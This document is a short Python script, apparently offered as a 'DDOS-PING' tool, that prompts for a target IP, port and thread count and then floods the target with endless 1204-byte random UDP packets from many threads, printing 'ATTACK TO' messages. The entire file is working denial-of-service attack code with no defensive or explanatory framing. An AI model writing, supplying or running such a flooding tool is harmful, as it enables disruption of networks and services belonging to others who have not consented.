#!/usr/bin/env python3

import random
import socket
import threading

print("|----DDOS-PING----|")
print("|----Anonymous----|")
ip = str(input(" IP:"))
port = int(input(" PORT:"))
threads = int(input("PING:"))
def run():
	data = random._urandom(1204)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			ad = (str(ip),int(port))
			for x in range(1):
				s.sendto(data, ad)
				
			print("[+] ATTACK TO", ip, port, "PING EXPORT =", threads)
			
for Y in range(threads):
		th = threading.Thread(target = run)
		th.start()
